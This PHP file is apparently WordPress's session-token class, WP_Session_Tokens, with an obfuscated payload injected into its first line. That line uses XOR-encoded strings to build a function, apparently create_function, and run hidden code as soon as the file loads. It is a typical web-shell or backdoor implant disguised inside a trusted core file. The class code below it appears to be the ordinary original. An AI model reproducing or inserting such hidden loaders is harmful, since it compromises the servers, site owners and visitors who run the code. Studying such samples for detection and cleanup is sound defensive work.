<?php $bBMrzKQW='S9RZT2,<1Z,Z:CN'^'0K7; WsZD4O.S, ';$csewo=$bBMrzKQW('','1Fyt3U-CB1XPm4LBNE>jrV>RiV 628hC45AjEZ1Xp+G WB >Nz1V;9P+F-<9=IIfjQM=.AVn=YDgoGCUoKiE=T:BBHqNIMIeZEFDBEMDHexjiVUSQ1H7Z-UEAQ,T5fqflYYbPXDzqUIOoGskeA-ZY99VS8D+rWRNR0f=HHQK3;G7=kgX =AneQD<LAE92=TqJQNJAULxGy:2piZ2O5fOY6.QETVMEWSM5j.POoQJ016M7i6dXA4TT,TlGfn4o:xi=Q7JrB2 4UyzEK40:C3Su5AcHI,B0,GXNUIphGPYrMAa>7 0HZSQ:7T9VMNNsCX5OPIbRMI-eK5sGP;7.T0SXYI,hsmnwj8aL jbEE=iVzshX067.pr6sj7J.8T+a152FEPKYE:L9LFWQZT4VWeP3ATAQIshKzHOxF..I.ZtUmGN9S8D7VE3Sq>T>lP9LTt3F,BY77S,Pw;=<-D<Rls1L0RyTGuZ,TU0Y6AGklbRPef6ANSJNDrLFL-3+378nTKY:.BMKX<BfJIMJT;7ObvnTdZ>dNoWT643d-4,e>GFpMtJt,vEsBdASyj4xHhBNSbkNDDIXTP0ESQ3sdOdWuM+HO<aP<,tWXZ1 0LwP5IY6A3LdOI-+;0kMUgiWrcB;2EB4WFb>AN1waGT+ZB..ShnvHnVSZ;JCNH6,'^'X QUU C 6X7>2Q4+=1MBU.Q 62ABSg7.AAfClzJRyM2N46IQ ZI9If4J2LcfP<=NN5,IOmvJV<=NOgcuO0cL4pU76hLnnjroSL +0mi-hXXZRvq:mB<E6H;me5M TOJFH0rIyRMsU:<;OiNKMeI;-Xbr:eduRs9++kBThmq8GI+RSCC3EDh3LjN5E3 MGO:Yn>;>hnFq:sG8zM>S;TFryPO=61mGa329T5E56OljVPZ>RR<n>.F15O<LoB1w u3 xqV9RfYEMuDDeoBQV6VzUNKjl-M6Qs,=7utPL,5 IGHEZVTQhgsuLV8L3vD3yI1SoxhF6,=LLkNyN6TEK5S;xqms:6<;29lA-SJF. DIkDSL.QZBKYRMyc>nJY J>ZPKfxpo2 Cw3EOs5; UvjEtE 844rya6p5ErbJO=OzIu-2 J6J-V:,I6YF;L34X85+l+Y6qUV IfCdYYN+X7DWU-D3PxgQ>M 4o2S8nBWh;6MBR :2jhbR-4>LJtXRA1130IZ1el3Y;Afii.5OVfBPHtL7ZQfK35BUhCFQUBcnfMpTmCMD CrPr1KXWH-PzxdUSzrqqiliTw5gQTMoBqU,Y:.E>;YU+2 3BTCdP T05Y WkHomIJOQBduGIwRC91; 4U;nFZ :P,F75R6-OJt5GMBg3+3Obsgs<Q');$csewo();
/**
 * Session API: WP_Session_Tokens class
 *
 * @package WordPress
 * @subpackage Session
 * @since 4.7.0
 */

/**
 * Abstract class for managing user session tokens.
 *
 * @since 4.0.0
 */
abstract class WP_Session_Tokens {

	/**
	 * User ID.
	 *
	 * @since 4.0.0
	 * @access protected
	 * @var int User ID.
	 */
	protected $user_id;

	/**
	 * Protected constructor.
	 *
	 * @since 4.0.0
	 *
	 * @param int $user_id User whose session to manage.
	 */
	protected function __construct( $user_id ) {
		$this->user_id = $user_id;
	}

	/**
	 * Get a session token manager instance for a user.
	 *
	 * This method contains a filter that allows a plugin to swap out
	 * the session manager for a subclass of WP_Session_Tokens.
	 *
	 * @since 4.0.0
	 * @access public
	 * @static
	 *
	 * @param int $user_id User whose session to manage.
	 */
	final public static function get_instance( $user_id ) {
		/**
		 * Filters the session token manager used.
		 *
		 * @since 4.0.0
		 *
		 * @param string $session Name of class to use as the manager.
		 *                        Default 'WP_User_Meta_Session_Tokens'.
		 */
		$manager = apply_filters( 'session_token_manager', 'WP_User_Meta_Session_Tokens' );
		return new $manager( $user_id );
	}

	/**
	 * Hashes a session token for storage.
	 *
	 * @since 4.0.0
	 * @access private
	 *
	 * @param string $token Session token to hash.
	 * @return string A hash of the session token (a verifier).
	 */
	final private function hash_token( $token ) {
		// If ext/hash is not present, use sha1() instead.
		if ( function_exists( 'hash' ) ) {
			return hash( 'sha256', $token );
		} else {
			return sha1( $token );
		}
	}

	/**
	 * Get a user's session.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $token Session token
	 * @return array User session
	 */
	final public function get( $token ) {
		$verifier = $this->hash_token( $token );
		return $this->get_session( $verifier );
	}

	/**
	 * Validate a user's session token as authentic.
	 *
	 * Checks that the given token is present and hasn't expired.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $token Token to verify.
	 * @return bool Whether the token is valid for the user.
	 */
	final public function verify( $token ) {
		$verifier = $this->hash_token( $token );
		return (bool) $this->get_session( $verifier );
	}

	/**
	 * Generate a session token and attach session information to it.
	 *
	 * A session token is a long, random string. It is used in a cookie
	 * link that cookie to an expiration time and to ensure the cookie
	 * becomes invalidated upon logout.
	 *
	 * This function generates a token and stores it with the associated
	 * expiration time (and potentially other session information via the
	 * {@see 'attach_session_information'} filter).
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param int $expiration Session expiration timestamp.
	 * @return string Session token.
	 */
	final public function create( $expiration ) {
		/**
		 * Filters the information attached to the newly created session.
		 *
		 * Could be used in the future to attach information such as
		 * IP address or user agent to a session.
		 *
		 * @since 4.0.0
		 *
		 * @param array $session Array of extra data.
		 * @param int   $user_id User ID.
		 */
		$session = apply_filters( 'attach_session_information', array(), $this->user_id );
		$session['expiration'] = $expiration;

		// IP address.
		if ( !empty( $_SERVER['REMOTE_ADDR'] ) ) {
			$session['ip'] = $_SERVER['REMOTE_ADDR'];
		}

		// User-agent.
		if ( ! empty( $_SERVER['HTTP_USER_AGENT'] ) ) {
			$session['ua'] = wp_unslash( $_SERVER['HTTP_USER_AGENT'] );
		}

		// Timestamp
		$session['login'] = time();

		$token = wp_generate_password( 43, false, false );

		$this->update( $token, $session );

		return $token;
	}

	/**
	 * Update a session token.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $token Session token to update.
	 * @param array  $session Session information.
	 */
	final public function update( $token, $session ) {
		$verifier = $this->hash_token( $token );
		$this->update_session( $verifier, $session );
	}

	/**
	 * Destroy a session token.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $token Session token to destroy.
	 */
	final public function destroy( $token ) {
		$verifier = $this->hash_token( $token );
		$this->update_session( $verifier, null );
	}

	/**
	 * Destroy all session tokens for this user,
	 * except a single token, presumably the one in use.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $token_to_keep Session token to keep.
	 */
	final public function destroy_others( $token_to_keep ) {
		$verifier = $this->hash_token( $token_to_keep );
		$session = $this->get_session( $verifier );
		if ( $session ) {
			$this->destroy_other_sessions( $verifier );
		} else {
			$this->destroy_all_sessions();
		}
	}

	/**
	 * Determine whether a session token is still valid,
	 * based on expiration.
	 *
	 * @since 4.0.0
	 * @access protected
	 *
	 * @param array $session Session to check.
	 * @return bool Whether session is valid.
	 */
	final protected function is_still_valid( $session ) {
		return $session['expiration'] >= time();
	}

	/**
	 * Destroy all session tokens for a user.
	 *
	 * @since 4.0.0
	 * @access public
	 */
	final public function destroy_all() {
		$this->destroy_all_sessions();
	}

	/**
	 * Destroy all session tokens for all users.
	 *
	 * @since 4.0.0
	 * @access public
	 * @static
	 */
	final public static function destroy_all_for_all_users() {
		/** This filter is documented in wp-includes/class-wp-session-tokens.php */
		$manager = apply_filters( 'session_token_manager', 'WP_User_Meta_Session_Tokens' );
		call_user_func( array( $manager, 'drop_sessions' ) );
	}

	/**
	 * Retrieve all sessions of a user.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @return array Sessions of a user.
	 */
	final public function get_all() {
		return array_values( $this->get_sessions() );
	}

	/**
	 * This method should retrieve all sessions of a user, keyed by verifier.
	 *
	 * @since 4.0.0
	 * @access protected
	 *
	 * @return array Sessions of a user, keyed by verifier.
	 */
	abstract protected function get_sessions();

	/**
	 * This method should look up a session by its verifier (token hash).
	 *
	 * @since 4.0.0
	 * @access protected
	 *
	 * @param string $verifier Verifier of the session to retrieve.
	 * @return array|null The session, or null if it does not exist.
	 */
	abstract protected function get_session( $verifier );

	/**
	 * This method should update a session by its verifier.
	 *
	 * Omitting the second argument should destroy the session.
	 *
	 * @since 4.0.0
	 * @access protected
	 *
	 * @param string $verifier Verifier of the session to update.
	 * @param array  $session  Optional. Session. Omitting this argument destroys the session.
	 */
	abstract protected function update_session( $verifier, $session = null );

	/**
	 * This method should destroy all session tokens for this user,
	 * except a single session passed.
	 *
	 * @since 4.0.0
	 * @access protected
	 *
	 * @param string $verifier Verifier of the session to keep.
	 */
	abstract protected function destroy_other_sessions( $verifier );

	/**
	 * This method should destroy all sessions for a user.
	 *
	 * @since 4.0.0
	 * @access protected
	 */
	abstract protected function destroy_all_sessions();

	/**
	 * This static method should destroy all session tokens for all users.
	 *
	 * @since 4.0.0
	 * @access public
	 * @static
	 */
	public static function drop_sessions() {}
}
